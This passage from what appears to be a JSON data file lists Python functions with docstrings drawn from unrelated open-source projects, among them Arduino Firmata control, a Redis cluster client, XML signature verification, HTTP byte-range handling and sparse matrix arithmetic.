            "def servo_config(self, pin, min_pulse=544, max_pulse=2400):\n        \"\"\"\n        Configure a pin as a servo pin. Set pulse min, max in ms.\n\n        :param pin: Servo Pin.\n\n        :param min_pulse: Min pulse width in ms.\n\n        :param max_pulse: Max pulse width in ms.\n\n        :return: No return value\n        \"\"\"\n        self.set_pin_mode(pin, self.SERVO, self.OUTPUT)\n        command = [pin, min_pulse & 0x7f, (min_pulse >> 7) & 0x7f,\n                   max_pulse & 0x7f, (max_pulse >> 7) & 0x7f]\n\n        self._command_handler.send_sysex(self._command_handler.SERVO_CONFIG, command)"
        ],
        [
            "def stepper_config(self, steps_per_revolution, stepper_pins):\n        \"\"\"\n        Configure stepper motor prior to operation.\n\n        :param steps_per_revolution: number of steps per motor revolution\n\n        :param stepper_pins: a list of control pin numbers - either 4 or 2\n        \"\"\"\n        data = [self.STEPPER_CONFIGURE, steps_per_revolution & 0x7f, (steps_per_revolution >> 7) & 0x7f]\n        for pin in range(len(stepper_pins)):\n            data.append(stepper_pins[pin])\n        self._command_handler.send_sysex(self._command_handler.STEPPER_DATA, data)"
        ],
        [
            "def stepper_step(self, motor_speed, number_of_steps):\n        \"\"\"\n        Move a stepper motor for the number of steps at the specified speed\n\n        :param motor_speed: 21 bits of data to set motor speed\n\n        :param number_of_steps: 14 bits for number of steps & direction\n                                positive is forward, negative is reverse\n        \"\"\"\n        if number_of_steps > 0:\n            direction = 1\n        else:\n            direction = 0\n        abs_number_of_steps = abs(number_of_steps)\n        data = [self.STEPPER_STEP, motor_speed & 0x7f, (motor_speed >> 7) & 0x7f, (motor_speed >> 14) & 0x7f,\n                abs_number_of_steps & 0x7f, (abs_number_of_steps >> 7) & 0x7f, direction]\n        self._command_handler.send_sysex(self._command_handler.STEPPER_DATA, data)"
        ],
        [
            "def stepper_request_library_version(self):\n        \"\"\"\n        Request the stepper library version from the Arduino.\n        To retrieve the version after this command is called, call\n        get_stepper_version\n        \"\"\"\n        data = [self.STEPPER_LIBRARY_VERSION]\n        self._command_handler.send_sysex(self._command_handler.STEPPER_DATA, data)"
        ],
        [
            "def open(self, verbose):\n        \"\"\"\n        open the serial port using the configuration data\n        returns a reference to this instance\n        \"\"\"\n        # open a serial port\n        if verbose:\n            print('\\nOpening Arduino Serial port %s ' % self.port_id)\n\n        try:\n\n            # in case the port is already open, let's close it and then\n            # reopen it\n            self.arduino.close()\n            time.sleep(1)\n            self.arduino.open()\n            time.sleep(1)\n            return self.arduino\n\n        except Exception:\n            # opened failed - will report back to caller\n            raise"
        ],
        [
            "def run(self):\n        \"\"\"\n        This method continually runs. If an incoming character is available on the serial port\n        it is read and placed on the _command_deque\n        @return: Never Returns\n        \"\"\"\n        while not self.is_stopped():\n            # we can get an OSError: [Errno9] Bad file descriptor when shutting down\n            # just ignore it\n            try:\n                if self.arduino.inWaiting():\n                    c = self.arduino.read()\n                    self.command_deque.append(ord(c))\n                else:\n                    time.sleep(.1)\n            except OSError:\n                pass\n            except IOError:\n                self.stop()\n        self.close()"
        ],
        [
            "def set_brightness(self, brightness):\n        \"\"\"\n        Set the brightness level for the entire display\n        @param brightness: brightness level (0 -15)\n        \"\"\"\n        if brightness > 15:\n            brightness = 15\n        brightness |= 0xE0\n        self.brightness = brightness\n        self.firmata.i2c_write(0x70, brightness)"
        ],
        [
            "def set_bit_map(self, shape, color):\n        \"\"\"\n        Populate the bit map with the supplied \"shape\" and color\n        and then write the entire bitmap to the display\n        @param shape: pattern to display\n        @param color: color for the pattern\n        \"\"\"\n        for row in range(0, 8):\n            data = shape[row]\n            # shift data into buffer\n            bit_mask = 0x80\n            for column in range(0, 8):\n                if data & bit_mask:\n                    self.set_pixel(row, column, color, True)\n                bit_mask >>= 1\n        self.output_entire_buffer()"
        ],
        [
            "def output_entire_buffer(self):\n        \"\"\"\n        Write the entire buffer to the display\n        \"\"\"\n        green = 0\n        red = 0\n\n        for row in range(0, 8):\n            for col in range(0, 8):\n                if self.display_buffer[row][col] == self.LED_GREEN:\n                    green |= 1 << col\n                elif self.display_buffer[row][col] == self.LED_RED:\n                    red |= 1 << col\n                elif self.display_buffer[row][col] == self.LED_YELLOW:\n                    green |= 1 << col\n                    red |= 1 << col\n                elif self.display_buffer[row][col] == self.LED_OFF:\n                    green &= ~(1 << col)\n                    red &= ~(1 << col)\n\n            self.firmata.i2c_write(0x70, row * 2, 0, green)\n            self.firmata.i2c_write(0x70, row * 2 + 1, 0, red)"
        ],
        [
            "def clear_display_buffer(self):\n        \"\"\"\n        Set all led's to off.\n        \"\"\"\n        for row in range(0, 8):\n            self.firmata.i2c_write(0x70, row * 2, 0, 0)\n            self.firmata.i2c_write(0x70, (row * 2) + 1, 0, 0)\n\n            for column in range(0, 8):\n                self.display_buffer[row][column] = 0"
        ],
        [
            "def digital_message(self, data):\n        \"\"\"\n        This method handles the incoming digital message.\n        It stores the data values in the digital response table.\n        Data is stored for all 8 bits of a  digital port\n\n        :param data: Message data from Firmata\n\n        :return: No return value.\n        \"\"\"\n        port = data[0]\n        port_data = (data[self.MSB] << 7) + data[self.LSB]\n\n        # set all the pins for this reporting port\n        # get the first pin number for this report\n        pin = port * 8\n        for pin in range(pin, min(pin + 8, self.total_pins_discovered)):\n            # shift through all the bit positions and set the digital response table\n            with self.pymata.data_lock:\n                # look at the previously stored value for this pin\n                prev_data = self.digital_response_table[pin][self.RESPONSE_TABLE_PIN_DATA_VALUE]\n                # get the current value\n                self.digital_response_table[pin][self.RESPONSE_TABLE_PIN_DATA_VALUE] = port_data & 0x01\n                # if the values differ and callback is enabled for the pin, then send out the callback\n                if prev_data != port_data & 0x01:\n                    callback = self.digital_response_table[pin][self.RESPONSE_TABLE_CALLBACK]\n                    if callback:\n                        callback([self.pymata.DIGITAL, pin,\n                                  self.digital_response_table[pin][self.RESPONSE_TABLE_PIN_DATA_VALUE]])\n\n                # determine if the latch data table needs to be updated for each pin\n                latching_entry = self.digital_latch_table[pin]\n                if latching_entry[self.LATCH_STATE] == self.LATCH_ARMED:\n                    if latching_entry[self.LATCHED_THRESHOLD_TYPE] == self.DIGITAL_LATCH_LOW:\n                        if (port_data & 0x01) == 0:\n                            if latching_entry[self.DIGITAL_LATCH_CALLBACK] is not None:\n                                self.digital_latch_table[pin] = [0, 0, 0, 0, None]\n                                latching_entry[self.DIGITAL_LATCH_CALLBACK](\n                                    [self.pymata.OUTPUT | self.pymata.LATCH_MODE,\n                                     pin, 0, time.time()])\n\n                            else:\n                                updated_latch_entry = latching_entry\n                                updated_latch_entry[self.LATCH_STATE] = self.LATCH_LATCHED\n                                updated_latch_entry[self.DIGITAL_LATCHED_DATA] = self.DIGITAL_LATCH_LOW\n                                # time stamp it\n                                updated_latch_entry[self.DIGITAL_TIME_STAMP] = time.time()\n                        else:\n                            pass\n                    elif latching_entry[self.LATCHED_THRESHOLD_TYPE] == self.DIGITAL_LATCH_HIGH:\n                        if port_data & 0x01:\n                            if latching_entry[self.DIGITAL_LATCH_CALLBACK] is not None:\n                                self.digital_latch_table[pin] = [0, 0, 0, 0, None]\n                                latching_entry[self.DIGITAL_LATCH_CALLBACK](\n                                    [self.pymata.OUTPUT | self.pymata.LATCH_MODE,\n                                     pin, 1, time.time()])\n                            else:\n                                updated_latch_entry = latching_entry\n                                updated_latch_entry[self.LATCH_STATE] = self.LATCH_LATCHED\n                                updated_latch_entry[self.DIGITAL_LATCHED_DATA] = self.DIGITAL_LATCH_HIGH\n                                # time stamp it\n                                updated_latch_entry[self.DIGITAL_TIME_STAMP] = time.time()\n                        else:\n                            pass\n                else:\n                    pass\n\n            # get the next data bit\n            port_data >>= 1"
        ],
        [
            "def encoder_data(self, data):\n        \"\"\"\n        This method handles the incoming encoder data message and stores\n        the data in the digital response table.\n\n        :param data: Message data from Firmata\n\n        :return: No return value.\n        \"\"\"\n        prev_val = self.digital_response_table[data[self.RESPONSE_TABLE_MODE]][self.RESPONSE_TABLE_PIN_DATA_VALUE]\n        val = int((data[self.MSB] << 7) + data[self.LSB])\n        # set value so that it shows positive and negative values\n        if val > 8192:\n            val -= 16384\n        pin = data[0]\n        with self.pymata.data_lock:\n            self.digital_response_table[data[self.RESPONSE_TABLE_MODE]][self.RESPONSE_TABLE_PIN_DATA_VALUE] = val\n            if prev_val != val:\n                callback = self.digital_response_table[pin][self.RESPONSE_TABLE_CALLBACK]\n                if callback is not None:\n                    callback([self.pymata.ENCODER, pin,\n                              self.digital_response_table[pin][self.RESPONSE_TABLE_PIN_DATA_VALUE]])"
        ],
        [
            "def sonar_data(self, data):\n        \"\"\"\n        This method handles the incoming sonar data message and stores\n        the data in the response table.\n\n        :param data: Message data from Firmata\n\n        :return: No return value.\n        \"\"\"\n        val = int((data[self.MSB] << 7) + data[self.LSB])\n        pin_number = data[0]\n        with self.pymata.data_lock:\n            sonar_pin_entry = self.active_sonar_map[pin_number]\n            # also write it into the digital response table\n            self.digital_response_table[data[self.RESPONSE_TABLE_MODE]][self.RESPONSE_TABLE_PIN_DATA_VALUE] = val\n            # send data through callback if there is a callback function for the pin\n            if sonar_pin_entry[0] is not None:\n                # check if value changed since last reading\n                if sonar_pin_entry[1] != val:\n                    self.active_sonar_map[pin_number][0]([self.pymata.SONAR, pin_number, val])\n            # update the data in the table with latest value\n            sonar_pin_entry[1] = val\n            self.active_sonar_map[pin_number] = sonar_pin_entry"
        ],
        [
            "def send_sysex(self, sysex_command, sysex_data=None):\n        \"\"\"\n        This method will send a Sysex command to Firmata with any accompanying data\n\n        :param sysex_command: sysex command\n\n        :param sysex_data: data for command\n\n        :return : No return value.\n        \"\"\"\n        if not sysex_data:\n            sysex_data = []\n\n        # convert the message command and data to characters\n        sysex_message = chr(self.START_SYSEX)\n        sysex_message += chr(sysex_command)\n        if len(sysex_data):\n            for d in sysex_data:\n                sysex_message += chr(d)\n        sysex_message += chr(self.END_SYSEX)\n\n        for data in sysex_message:\n            self.pymata.transport.write(data)"
        ],
        [
            "def send_command(self, command):\n        \"\"\"\n        This method is used to transmit a non-sysex command.\n\n        :param command: Command to send to firmata includes command + data formatted by caller\n\n        :return : No return value.\n        \"\"\"\n        send_message = \"\"\n        for i in command:\n            send_message += chr(i)\n\n        for data in send_message:\n            self.pymata.transport.write(data)"
        ],
        [
            "def system_reset(self):\n        \"\"\"\n        Send the reset command to the Arduino.\n        It resets the response tables to their initial values\n\n        :return: No return value\n        \"\"\"\n        data = chr(self.SYSTEM_RESET)\n        self.pymata.transport.write(data)\n\n        # response table re-initialization\n        # for each pin set the mode to input and the last read data value to zero\n        with self.pymata.data_lock:\n            # remove all old entries from existing tables\n            for _ in range(len(self.digital_response_table)):\n                self.digital_response_table.pop()\n\n            for _ in range(len(self.analog_response_table)):\n                self.analog_response_table.pop()\n\n            # reinitialize tables\n            for pin in range(0, self.total_pins_discovered):\n                response_entry = [self.pymata.INPUT, 0, None]\n                self.digital_response_table.append(response_entry)\n\n            for pin in range(0, self.number_of_analog_pins_discovered):\n                response_entry = [self.pymata.INPUT, 0, None]\n                self.analog_response_table.append(response_entry)"
        ],
        [
            "def _string_data(self, data):\n        \"\"\"\n        This method handles the incoming string data message from Firmata.\n        The string is printed to the console\n\n        :param data: Message data from Firmata\n\n        :return: No return value.s\n        \"\"\"\n        print(\"_string_data:\")\n        string_to_print = []\n        for i in data[::2]:\n            string_to_print.append(chr(i))\n        print(\"\".join(string_to_print))"
        ],
        [
            "def run(self):\n        \"\"\"\n        This method starts the thread that continuously runs to receive and interpret\n        messages coming from Firmata. This must be the last method in this file\n        It also checks the deque for messages to be sent to Firmata.\n        \"\"\"\n        # To add a command to the command dispatch table, append here.\n        self.command_dispatch.update({self.REPORT_VERSION: [self.report_version, 2]})\n        self.command_dispatch.update({self.REPORT_FIRMWARE: [self.report_firmware, 1]})\n        self.command_dispatch.update({self.ANALOG_MESSAGE: [self.analog_message, 2]})\n        self.command_dispatch.update({self.DIGITAL_MESSAGE: [self.digital_message, 2]})\n        self.command_dispatch.update({self.ENCODER_DATA: [self.encoder_data, 3]})\n        self.command_dispatch.update({self.SONAR_DATA: [self.sonar_data, 3]})\n        self.command_dispatch.update({self.STRING_DATA: [self._string_data, 2]})\n        self.command_dispatch.update({self.I2C_REPLY: [self.i2c_reply, 2]})\n        self.command_dispatch.update({self.CAPABILITY_RESPONSE: [self.capability_response, 2]})\n        self.command_dispatch.update({self.PIN_STATE_RESPONSE: [self.pin_state_response, 2]})\n        self.command_dispatch.update({self.ANALOG_MAPPING_RESPONSE: [self.analog_mapping_response, 2]})\n        self.command_dispatch.update({self.STEPPER_DATA: [self.stepper_version_response, 2]})\n\n        while not self.is_stopped():\n            if len(self.pymata.command_deque):\n                # get next byte from the deque and process it\n                data = self.pymata.command_deque.popleft()\n\n                # this list will be populated with the received data for the command\n                command_data = []\n\n                # process sysex commands\n                if data == self.START_SYSEX:\n                    # next char is the actual sysex command\n                    # wait until we can get data from the deque\n                    while len(self.pymata.command_deque) == 0:\n                        pass\n                    sysex_command = self.pymata.command_deque.popleft()\n                    # retrieve the associated command_dispatch entry for this command\n                    dispatch_entry = self.command_dispatch.get(sysex_command)\n\n                    # get a \"pointer\" to the method that will process this command\n                    method = dispatch_entry[0]\n\n                    # now get the rest of the data excluding the END_SYSEX byte\n                    end_of_sysex = False\n                    while not end_of_sysex:\n                        # wait for more data to arrive\n                        while len(self.pymata.command_deque) == 0:\n                            pass\n                        data = self.pymata.command_deque.popleft()\n                        if data != self.END_SYSEX:\n                            command_data.append(data)\n                        else:\n                            end_of_sysex = True\n\n                            # invoke the method to process the command\n                            method(command_data)\n                            # go to the beginning of the loop to process the next command\n                    continue\n\n                # is this a command byte in the range of 0x80-0xff - these are the non-sysex messages\n\n                elif 0x80 <= data <= 0xff:\n                    # look up the method for the command in the command dispatch table\n                    # for the digital reporting the command value is modified with port number\n                    # the handler needs the port to properly process, so decode that from the command and\n                    # place in command_data\n                    if 0x90 <= data <= 0x9f:\n                        port = data & 0xf\n                        command_data.append(port)\n                        data = 0x90\n                    # the pin number for analog data is embedded in the command so, decode it\n                    elif 0xe0 <= data <= 0xef:\n                        pin = data & 0xf\n                        command_data.append(pin)\n                        data = 0xe0\n                    else:\n                        pass\n\n                    dispatch_entry = self.command_dispatch.get(data)\n\n                    # this calls the method retrieved from the dispatch table\n                    method = dispatch_entry[0]\n\n                    # get the number of parameters that this command provides\n                    num_args = dispatch_entry[1]\n\n                    # look at the number of args that the selected method requires\n                    # now get that number of bytes to pass to the called method\n                    for i in range(num_args):\n                        while len(self.pymata.command_deque) == 0:\n                            pass\n                        data = self.pymata.command_deque.popleft()\n                        command_data.append(data)\n                        # go execute the command with the argument list\n                    method(command_data)\n\n                    # go to the beginning of the loop to process the next command\n                    continue\n            else:\n                time.sleep(.1)"
        ],
        [
            "def retrieve_url(self, url):\n        \"\"\"\n        Use requests to fetch remote content\n        \"\"\"\n\n        try:\n            r = requests.get(url)\n        except requests.ConnectionError:\n            raise exceptions.RetrieveError('Connection fail')\n\n        if r.status_code >= 400:\n            raise exceptions.RetrieveError('Connected, but status code is %s' % (r.status_code))\n\n        real_url = r.url\n        content = r.content\n\n        try:\n            content_type = r.headers['Content-Type']\n        except KeyError:\n            content_type, encoding = mimetypes.guess_type(real_url, strict=False)\n\n        self.response = r\n\n        return content_type.lower(), content"
        ],
        [
            "def image_urls(self):\n        \"\"\"\n        Combine finder_image_urls and extender_image_urls,\n        remove duplicate but keep order\n        \"\"\"\n\n        all_image_urls = self.finder_image_urls[:]\n        for image_url in self.extender_image_urls:\n            if image_url not in all_image_urls:\n                all_image_urls.append(image_url)\n\n        return all_image_urls"
        ],
        [
            "def background_image_finder(pipeline_index,\n                            soup,\n                            finder_image_urls=[],\n                            *args, **kwargs):\n    \"\"\"\n    Find image URL in background-image\n\n    Example:\n    <div style=\"width: 100%; height: 100%; background-image: url(http://distilleryimage10.ak.instagram.com/bde04558a43b11e28e5d22000a1f979a_7.jpg);\" class=\"Image iLoaded iWithTransition Frame\" src=\"http://distilleryimage10.ak.instagram.com/bde04558a43b11e28e5d22000a1f979a_7.jpg\"></div>\n    to\n    http://distilleryimage10.ak.instagram.com/bde04558a43b11e28e5d22000a1f979a_7.jpg\n    \"\"\"\n\n    now_finder_image_urls = []\n\n    for tag in soup.find_all(style=True):\n        style_string = tag['style']\n        if 'background-image' in style_string.lower():\n            style = cssutils.parseStyle(style_string)\n            background_image = style.getProperty('background-image')\n            if background_image:\n                for property_value in background_image.propertyValue:\n                    background_image_url = str(property_value.value)\n                    if background_image_url:\n                        if (background_image_url not in finder_image_urls) and \\\n                           (background_image_url not in now_finder_image_urls):\n                            now_finder_image_urls.append(background_image_url)\n\n    output = {}\n    output['finder_image_urls'] = finder_image_urls + now_finder_image_urls\n\n    return output"
        ],
        [
            "def _getnodenamefor(self, name):\n        \"Return the node name where the ``name`` would land to\"\n        return 'node_' + str(\n            (abs(binascii.crc32(b(name)) & 0xffffffff) % self.no_servers) + 1)"
        ],
        [
            "def getnodefor(self, name):\n        \"Return the node where the ``name`` would land to\"\n        node = self._getnodenamefor(name)\n        return {node: self.cluster['nodes'][node]}"
        ],
        [
            "def object(self, infotype, key):\n        \"Return the encoding, idletime, or refcount about the key\"\n        redisent = self.redises[self._getnodenamefor(key) + '_slave']\n        return getattr(redisent, 'object')(infotype, key)"
        ],
        [
            "def _rc_brpoplpush(self, src, dst, timeout=0):\n        \"\"\"\n        Pop a value off the tail of ``src``, push it on the head of ``dst``\n        and then return it.\n\n        This command blocks until a value is in ``src`` or until ``timeout``\n        seconds elapse, whichever is first. A ``timeout`` value of 0 blocks\n        forever.\n        Not atomic\n        \"\"\"\n        rpop = self.brpop(src, timeout)\n        if rpop is not None:\n            self.lpush(dst, rpop[1])\n            return rpop[1]\n        return None"
        ],
        [
            "def _rc_rpoplpush(self, src, dst):\n        \"\"\"\n        RPOP a value off of the ``src`` list and LPUSH it\n        on to the ``dst`` list.  Returns the value.\n        \"\"\"\n        rpop = self.rpop(src)\n        if rpop is not None:\n            self.lpush(dst, rpop)\n            return rpop\n        return None"
        ],
        [
            "def _rc_smove(self, src, dst, value):\n        \"\"\"\n        Move ``value`` from set ``src`` to set ``dst``\n        not atomic\n        \"\"\"\n        if self.type(src) != b(\"set\"):\n            return self.smove(src + \"{\" + src + \"}\", dst, value)\n        if self.type(dst) != b(\"set\"):\n            return self.smove(dst + \"{\" + dst + \"}\", src, value)\n        if self.srem(src, value):\n            return 1 if self.sadd(dst, value) else 0\n        return 0"
        ],
        [
            "def _rc_sunion(self, src, *args):\n        \"\"\"\n        Returns the members of the set resulting from the union between\n        the first set and all the successive sets.\n        \"\"\"\n        args = list_or_args(src, args)\n        src_set = self.smembers(args.pop(0))\n        if src_set is not set([]):\n            for key in args:\n                src_set.update(self.smembers(key))\n        return src_set"
        ],
        [
            "def _rc_sunionstore(self, dst, src, *args):\n        \"\"\"\n        Store the union of sets ``src``,  ``args`` into a new\n        set named ``dest``.  Returns the number of keys in the new set.\n        \"\"\"\n        args = list_or_args(src, args)\n        result = self.sunion(*args)\n        if result is not set([]):\n            return self.sadd(dst, *list(result))\n        return 0"
        ],
        [
            "def _rc_msetnx(self, mapping):\n        \"\"\"\n        Sets each key in the ``mapping`` dict to its corresponding value if\n        none of the keys are already set\n        \"\"\"\n        for k in iterkeys(mapping):\n            if self.exists(k):\n                return False\n\n        return self._rc_mset(mapping)"
        ],
        [
            "def _rc_rename(self, src, dst):\n        \"\"\"\n        Rename key ``src`` to ``dst``\n        \"\"\"\n        if src == dst:\n            return self.rename(src + \"{\" + src + \"}\", src)\n        if not self.exists(src):\n            return self.rename(src + \"{\" + src + \"}\", src)\n\n        self.delete(dst)\n        ktype = self.type(src)\n        kttl = self.ttl(src)\n\n        if ktype == b('none'):\n            return False\n\n        if ktype == b('string'):\n            self.set(dst, self.get(src))\n        elif ktype == b('hash'):\n            self.hmset(dst, self.hgetall(src))\n        elif ktype == b('list'):\n            for k in self.lrange(src, 0, -1):\n                self.rpush(dst, k)\n        elif ktype == b('set'):\n            for k in self.smembers(src):\n                self.sadd(dst, k)\n        elif ktype == b('zset'):\n            for k, v in self.zrange(src, 0, -1, withscores=True):\n                self.zadd(dst, v, k)\n\n        # Handle keys with an expire time set\n        kttl = -1 if kttl is None or kttl < 0 else int(kttl)\n        if kttl != -1:\n            self.expire(dst, kttl)\n\n        return self.delete(src)"
        ],
        [
            "def _rc_renamenx(self, src, dst):\n        \"Rename key ``src`` to ``dst`` if ``dst`` doesn't already exist\"\n        if self.exists(dst):\n            return False\n\n        return self._rc_rename(src, dst)"
        ],
        [
            "def _rc_keys(self, pattern='*'):\n        \"Returns a list of keys matching ``pattern``\"\n\n        result = []\n        for alias, redisent in iteritems(self.redises):\n            if alias.find('_slave') == -1:\n                continue\n\n            result.extend(redisent.keys(pattern))\n\n        return result"
        ],
        [
            "def _rc_dbsize(self):\n        \"Returns the number of keys in the current database\"\n\n        result = 0\n        for alias, redisent in iteritems(self.redises):\n            if alias.find('_slave') == -1:\n                continue\n\n            result += redisent.dbsize()\n\n        return result"
        ],
        [
            "def prepare(self):\n        \"\"\"Prepare the date in the instance state for serialization.\n        \"\"\"\n\n        # Create a collection for the attributes and elements of\n        # this instance.\n        attributes, elements = OrderedDict(), []\n\n        # Initialize the namespace map.\n        nsmap = dict([self.meta.namespace])\n\n        # Iterate through all declared items.\n        for name, item in self._items.items():\n            if isinstance(item, Attribute):\n                # Prepare the item as an attribute.\n                attributes[name] = item.prepare(self)\n\n            elif isinstance(item, Element):\n                # Update the nsmap.\n                nsmap.update([item.namespace])\n\n                # Prepare the item as an element.\n                elements.append(item)\n\n        # Return the collected attributes and elements\n        return attributes, elements, nsmap"
        ],
        [
            "def verify(xml, stream):\n    \"\"\"\n    Verify the signaure of an XML document with the given certificate.\n    Returns `True` if the document is signed with a valid signature.\n    Returns `False` if the document is not signed or if the signature is\n    invalid.\n\n    :param lxml.etree._Element xml: The document to sign\n    :param file stream: The private key to sign the document with\n\n    :rtype: Boolean\n    \"\"\"\n    # Import xmlsec here to delay initializing the C library in\n    # case we don't need it.\n    import xmlsec\n\n    # Find the <Signature/> node.\n    signature_node = xmlsec.tree.find_node(xml, xmlsec.Node.SIGNATURE)\n    if signature_node is None:\n        # No `signature` node found; we cannot verify\n        return False\n\n    # Create a digital signature context (no key manager is needed).\n    ctx = xmlsec.SignatureContext()\n\n    # Register <Response/> and <Assertion/>\n    ctx.register_id(xml)\n    for assertion in xml.xpath(\"//*[local-name()='Assertion']\"):\n        ctx.register_id(assertion)\n\n    # Load the public key.\n    key = None\n    for fmt in [\n            xmlsec.KeyFormat.PEM,\n            xmlsec.KeyFormat.CERT_PEM]:\n        stream.seek(0)\n        try:\n            key = xmlsec.Key.from_memory(stream, fmt)\n            break\n        except ValueError:  \n            # xmlsec now throws when it can't load the key\n            pass\n\n    # Set the key on the context.\n    ctx.key = key\n\n    # Verify the signature.\n    try:\n        ctx.verify(signature_node)\n\n        return True\n\n    except Exception:\n        return False"
        ],
        [
            "def get_queryset(self, request):\n        \"\"\"\n        Add number of photos to each gallery.\n        \"\"\"\n        qs = super(GalleryAdmin, self).get_queryset(request)\n        return qs.annotate(photo_count=Count('photos'))"
        ],
        [
            "def save_model(self, request, obj, form, change):\n        \"\"\"\n        Set currently authenticated user as the author of the gallery.\n        \"\"\"\n        obj.author = request.user\n        obj.save()"
        ],
        [
            "def save_formset(self, request, form, formset, change):\n        \"\"\"\n        For each photo set it's author to currently authenticated user.\n        \"\"\"\n        instances = formset.save(commit=False)\n        for instance in instances:\n            if isinstance(instance, Photo):\n                instance.author = request.user\n            instance.save()"
        ],
        [
            "def parse_byteranges(cls, environ):\n        \"\"\"\n        Outputs a list of tuples with ranges or the empty list\n        According to the rfc, start or end values can be omitted\n        \"\"\"\n        r = []\n        s = environ.get(cls.header_range, '').replace(' ','').lower()\n        if s:\n            l = s.split('=')\n            if len(l) == 2:\n                unit, vals = tuple(l)\n                if unit == 'bytes' and vals:\n                    gen_rng = ( tuple(rng.split('-')) for rng in vals.split(',') if '-' in rng )\n                    for start, end in gen_rng:\n                        if start or end:\n                            r.append( (int(start) if start else None, int(end) if end else None) )\n        return r"
        ],
        [
            "def check_ranges(cls, ranges, length):\n        \"\"\"Removes errored ranges\"\"\"\n        result = []\n        for start, end in ranges:\n            if isinstance(start, int) or isinstance(end, int):\n                if isinstance(start, int) and not (0 <= start < length):\n                    continue\n                elif isinstance(start, int) and isinstance(end, int) and not (start <= end):\n                    continue\n                elif start is None and end == 0:\n                    continue\n                result.append( (start,end) )\n        return result"
        ],
        [
            "def convert_ranges(cls, ranges, length):\n        \"\"\"Converts to valid byte ranges\"\"\"\n        result = []\n        for start, end in ranges:\n            if end is None:\n                result.append( (start, length-1) )\n            elif start is None:\n                s = length - end\n                result.append( (0 if s < 0 else s, length-1) )\n            else:\n                result.append( (start, end if end < length else length-1) )\n        return result"
        ],
        [
            "def condense_ranges(cls, ranges):\n        \"\"\"Sorts and removes overlaps\"\"\"\n        result = []\n        if ranges:\n            ranges.sort(key=lambda tup: tup[0])\n            result.append(ranges[0])\n            for i in range(1, len(ranges)):\n                if result[-1][1] + 1 >= ranges[i][0]:\n                    result[-1] = (result[-1][0], max(result[-1][1], ranges[i][1]))\n                else:\n                    result.append(ranges[i])\n        return result"
        ],
        [
            "def social_widget_render(parser, token):\n    \"\"\" Renders the selected social widget. You can specify optional settings\n    that will be passed  to widget template.\n\n    Sample usage:\n    {% social_widget_render widget_template ke1=val1 key2=val2 %}\n\n    For example to render Twitter follow button you can use code like this:\n    {% social_widget_render 'twitter/follow_button.html' username=\"ev\" %}\n    \"\"\"\n    bits = token.split_contents()\n    tag_name = bits[0]\n\n    if len(bits) < 2:\n        raise TemplateSyntaxError(\"'%s' takes at least one argument\" %\n                                  tag_name)\n    args = []\n    kwargs = {}\n\n    bits = bits[1:]\n\n    if len(bits):\n        for bit in bits:\n            match = kwarg_re.match(bit)\n            if not match:\n                raise TemplateSyntaxError(\"Malformed arguments to %s tag\" %\n                                          tag_name)\n            name, value = match.groups()\n\n            if name:\n                # Replacing hyphens with underscores because\n                # variable names cannot contain hyphens.\n                name = name.replace('-', '_')\n                kwargs[name] = parser.compile_filter(value)\n            else:\n                args.append(parser.compile_filter(value))\n\n    return SocialWidgetNode(args, kwargs)"
        ],
        [
            "def add(self, addend_mat, axis=1):\n        \"\"\"\n        In-place addition\n\n        :param addend_mat: A matrix to be added on the Sparse3DMatrix object\n        :param axis: The dimension along the addend_mat is added\n        :return: Nothing (as it performs in-place operations)\n        \"\"\"\n        if self.finalized:\n            if axis == 0:\n                raise NotImplementedError('The method is not yet implemented for the axis.')\n            elif axis == 1:\n                for hid in xrange(self.shape[1]):\n                    self.data[hid] = self.data[hid] + addend_mat\n            elif axis == 2:\n                raise NotImplementedError('The method is not yet implemented for the axis.')\n            else:\n                raise RuntimeError('The axis should be 0, 1, or 2.')\n        else:\n            raise RuntimeError('The original matrix must be finalized.')"
        ],
        [
            "def multiply(self, multiplier, axis=None):\n        \"\"\"\n        In-place multiplication\n\n        :param multiplier: A matrix or vector to be multiplied\n        :param axis: The dim along which 'multiplier' is multiplied\n        :return: Nothing (as it performs in-place operations)\n        \"\"\"\n        if self.finalized:\n            if multiplier.ndim == 1:\n                if axis == 0:  # multiplier is np.array of length |haplotypes|\n                    raise NotImplementedError('The method is not yet implemented for the axis.')\n                elif axis == 1:  # multiplier is np.array of length |loci|\n                    sz = len(multiplier)\n                    multiplier_mat = lil_matrix((sz, sz))\n                    multiplier_mat.setdiag(multiplier)\n                    for hid in xrange(self.shape[1]):\n                        self.data[hid] = self.data[hid] * multiplier_mat\n                elif axis == 2:  # multiplier is np.array of length |reads|\n                    for hid in xrange(self.shape[1]):\n                        self.data[hid].data *= multiplier[self.data[hid].indices]\n                else:\n                    raise RuntimeError('The axis should be 0, 1, or 2.')\n            elif multiplier.ndim == 2:\n                if axis == 0:  # multiplier is sp.sparse matrix of shape |reads| x |haplotypes|\n                    for hid in xrange(self.shape[1]):\n                        self.data[hid].data *= multiplier[self.data[hid].indices, hid]\n                elif axis == 1:  # multiplier is sp.sparse matrix of shape |reads| x |loci|\n                    for hid in xrange(self.shape[1]):\n                        self.data[hid] = self.data[hid].multiply(multiplier)\n                elif axis == 2:  # multiplier is np.matrix of shape |haplotypes| x |loci|\n                    for hid in xrange(self.shape[1]):\n                        multiplier_vec = multiplier[hid, :]\n                        multiplier_vec = multiplier_vec.ravel()\n                        self.data[hid].data *= multiplier_vec.repeat(np.diff(self.data[hid].indptr))\n                else:\n                    raise RuntimeError('The axis should be 0, 1, or 2.')\n            elif isinstance(multiplier, Sparse3DMatrix):  # multiplier is Sparse3DMatrix object\n                    for hid in xrange(self.shape[1]):\n                        self.data[hid] = self.data[hid].multiply(multiplier.data[hid])\n            else:\n                raise RuntimeError('The multiplier should be 1, 2 dimensional numpy array or a Sparse3DMatrix object.')\n        else:\n            raise RuntimeError('The original matrix must be finalized.')"
        ],
        [
